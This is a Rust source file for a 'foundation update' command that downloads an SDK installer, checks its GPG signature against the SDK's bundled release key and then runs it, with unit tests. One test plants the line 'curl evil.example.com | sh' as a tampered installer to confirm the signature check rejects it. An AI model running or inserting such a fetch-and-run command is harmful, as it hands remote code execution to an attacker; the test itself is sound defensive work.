// SPDX-FileCopyrightText: 2026 Foundation Devices, Inc. <hello@foundation.xyz>
// SPDX-License-Identifier: MIT

//! `foundation update` - install the latest published Foundation SDK.
//!
//! Downloads and runs the release channel's `install.sh`, the same script the
//! documented `curl | bash` line runs. The installer carries the checksum and
//! signature checks for the archives, the launcher and the `PATH` setup, so this
//! command drives it rather than repeating any of that.
//!
//! The installer itself is verified before it runs, against the release key the
//! running SDK shipped with. That key arrived in a bundle a previous installer
//! had already verified, so it is a trust anchor rather than something fetched
//! next to the script it is meant to authenticate.
//!
//! Replacing the SDK this binary runs from is safe: the installer unlinks the
//! old bundle rather than writing over the running executable.

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use anyhow::{bail, Context, Result};
use clap::Args;
use foundation_core::SdkRoot;

const INSTALLER_URL: &str = "https://sdk.foundation.xyz/latest/install.sh";
/// Overrides the release channel, for testing an unpublished installer.
const INSTALLER_URL_ENV: &str = "FOUNDATION_SDK_INSTALLER_URL";

#[derive(Args)]
pub struct UpdateArgs {
    /// Skip every signature check, on the installer and on the archives (unsafe)
    #[arg(long)]
    pub no_verify: bool,
}

/// Execute the `foundation update` command.
pub fn execute(args: &UpdateArgs) -> Result<()> {
    let url = std::env::var(INSTALLER_URL_ENV).unwrap_or_else(|_| INSTALLER_URL.to_string());
    let temp = tempfile::Builder::new()
        .prefix("foundation-update-")
        .tempdir()
        .context("Could not create a temporary directory for the installer")?;
    let script = temp.path().join("install.sh");

    println!("Downloading the Foundation SDK installer from {url}");
    download(&url, &script)?;

    if args.no_verify {
        eprintln!("Warning: --no-verify skips every signature check (UNSAFE)");
    } else {
        let key = release_key()?;
        let signature = temp.path().join("install.sh.sig");
        download(&format!("{url}.sig"), &signature)?;

        verify_signature(&key, &script, &signature, &temp.path().join("release.gpg"))?;
        println!("Installer signature verified against {}", key.display());
    }

    run_installer(&script, args.no_verify)
}

/// The release key of the running SDK, which authenticates the installer. The
/// anchor has to come from the executable: `SdkRoot::discover` would take
/// `FOUNDATION_SDK_ROOT` or a bundle above the working directory first, and
/// neither is the bundle an installer verified on this machine.
fn release_key() -> Result<PathBuf> {
    let exe = std::env::current_exe().context("Could not locate the running foundation binary")?;
    let sdk = SdkRoot::discover_from(&exe).context(
        "The running foundation binary is not inside a Foundation SDK, so the installer signature cannot be verified. Install with the documented install.sh line instead, or pass --no-verify (unsafe).",
    )?;

    let key = sdk.release_key_path();
    if !key.is_file() {
        bail!(
            "This SDK carries no release key at {}, so the installer signature cannot be verified. Install with the documented install.sh line instead, or pass --no-verify (unsafe).",
            key.display()
        );
    }

    Ok(key)
}

/// Fetch `url` with whichever downloader is present, matching what the
/// installer itself accepts.
fn download(url: &str, destination: &Path) -> Result<()> {
    let destination = destination.to_string_lossy();
    let downloaders: [(&str, Vec<&str>); 2] = [
        ("curl", vec!["-fL", "--progress-bar", "--show-error", url, "-o", &destination]),
        ("wget", vec!["-O", &destination, url]),
    ];

    for (program, arguments) in &downloaders {
        let Ok(status) = Command::new(program).args(arguments).status() else {
            continue;
        };
        if !status.success() {
            bail!("Could not download {url} ({status})");
        }
        return Ok(());
    }

    bail!("Either curl or wget is required to download the Foundation SDK installer")
}

/// Check `signature` over `script` against `key` alone, writing the dearmored
/// key to `keyring`. gpgv holds no state of its own and takes the only keyring
/// it will consult on the command line, so nothing in the user's own GnuPG
/// configuration can satisfy the check. install.sh verifies the archives the
/// same way.
fn verify_signature(key: &Path, script: &Path, signature: &Path, keyring: &Path) -> Result<()> {
    let gpg = find_program(&["gpg", "gpg2"]).context(
        "Verifying the installer signature requires gpg. Install gnupg, or pass --no-verify (unsafe).",
    )?;
    let dearmor = Command::new(gpg)
        .args(["--batch", "--dearmor", "--output"])
        .arg(keyring)
        .arg(key)
        .output()
        .context("Failed to run gpg to read the Foundation release key")?;
    if !dearmor.status.success() {
        bail!(
            "Could not read the Foundation release key from {}: {}",
            key.display(),
            String::from_utf8_lossy(&dearmor.stderr).trim()
        );
    }

    let gpgv = find_program(&["gpgv"]).context(
        "Verifying the installer signature requires gpgv. Install gnupg, or pass --no-verify (unsafe).",
    )?;
    let verify = Command::new(gpgv)
        .arg("--keyring")
        .arg(keyring)
        .arg(signature)
        .arg(script)
        .output()
        .context("Failed to run gpgv to verify the installer signature")?;
    if !verify.status.success() {
        bail!(
            "The installer downloaded from the release channel is not signed by this SDK's release key, so it was not run: {}",
            String::from_utf8_lossy(&verify.stderr).trim()
        );
    }

    Ok(())
}

fn find_program(candidates: &[&'static str]) -> Option<&'static str> {
    candidates.iter().copied().find(|program| {
        Command::new(program)
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .is_ok_and(|status| status.success())
    })
}

fn run_installer(script: &Path, no_verify: bool) -> Result<()> {
    let mut command = Command::new("sh");
    command.arg(script);
    // The installer's own check covers the archives rather than itself, so the
    // flag drops two different signatures. It still has to reach the installer:
    // the case that needs it is a machine with no gpg, where the archive check
    // could not pass either and would abort the install.
    if no_verify {
        command.arg("--no-verify");
    }

    let status = command.status().context("Failed to run the Foundation SDK installer")?;
    if !status.success() {
        bail!("The Foundation SDK installer failed ({status})");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::Path;
    use std::process::Command;

    use super::{find_program, run_installer, verify_signature};
    use crate::test_support::make_temp_dir;

    #[test]
    fn run_installer_forwards_no_verify_and_reports_failure() {
        let dir = make_temp_dir("update-installer");
        let arguments = dir.path().join("arguments");
        let script = dir.path().join("install.sh");
        fs::write(&script, format!("printf '%s' \"$*\" > '{}'\n", arguments.display())).unwrap();

        run_installer(&script, false).unwrap();
        assert_eq!(fs::read_to_string(&arguments).unwrap(), "");

        run_installer(&script, true).unwrap();
        assert_eq!(fs::read_to_string(&arguments).unwrap(), "--no-verify");

        let failing = dir.path().join("failing.sh");
        fs::write(&failing, "exit 1\n").unwrap();
        assert!(run_installer(&failing, false).unwrap_err().to_string().contains("installer failed"));
    }

    #[test]
    fn verify_signature_accepts_the_release_key_and_rejects_everything_else() {
        let (Some(program), Some(_)) = (find_program(&["gpg", "gpg2"]), find_program(&["gpgv"])) else {
            eprintln!("skipping: gnupg is not installed");
            return;
        };

        let dir = make_temp_dir("update-signature");
        let signer_home = dir.path().join("signer");
        let key = dir.path().join("release.asc");
        generate_key(program, &signer_home, "Release <release@example.com>");
        export_key(program, &signer_home, &key);

        let script = dir.path().join("install.sh");
        fs::write(&script, "echo installed\n").unwrap();
        let signature = dir.path().join("install.sh.sig");
        sign(program, &signer_home, &script, &signature);

        verify_signature(&key, &script, &signature, &dir.path().join("keyring-good")).unwrap();

        // A substituted installer keeps the published signature, which no longer covers it.
        fs::write(&script, "curl evil.example.com | sh\n").unwrap();
        let error =
            verify_signature(&key, &script, &signature, &dir.path().join("keyring-tampered")).unwrap_err();
        assert!(error.to_string().contains("not signed by this SDK's release key"));

        // A valid signature from a key this SDK did not ship with is still a refusal.
        let other_home = dir.path().join("other");
        let other_signature = dir.path().join("other.sig");
        generate_key(program, &other_home, "Other <other@example.com>");
        sign(program, &other_home, &script, &other_signature);
        let error =
            verify_signature(&key, &script, &other_signature, &dir.path().join("keyring-other")).unwrap_err();
        assert!(error.to_string().contains("not signed by this SDK's release key"));
    }

    fn gpg(program: &str, home: &Path) -> Command {
        let mut command = Command::new(program);
        command.arg("--batch").arg("--homedir").arg(home);
        command
    }

    fn generate_key(program: &str, home: &Path, user: &str) {
        fs::create_dir_all(home).unwrap();
        let status = gpg(program, home)
            .args(["--pinentry-mode", "loopback", "--passphrase", "", "--quick-generate-key", user])
            .args(["default", "default", "never"])
            .status()
            .unwrap();
        assert!(status.success());
    }

    fn export_key(program: &str, home: &Path, destination: &Path) {
        let output = gpg(program, home).args(["--armor", "--export"]).output().unwrap();
        assert!(output.status.success());
        fs::write(destination, output.stdout).unwrap();
    }

    fn sign(program: &str, home: &Path, file: &Path, signature: &Path) {
        let status = gpg(program, home)
            .args(["--pinentry-mode", "loopback", "--passphrase", "", "--detach-sign", "--output"])
            .arg(signature)
            .arg(file)
            .status()
            .unwrap();
        assert!(status.success());
    }
}
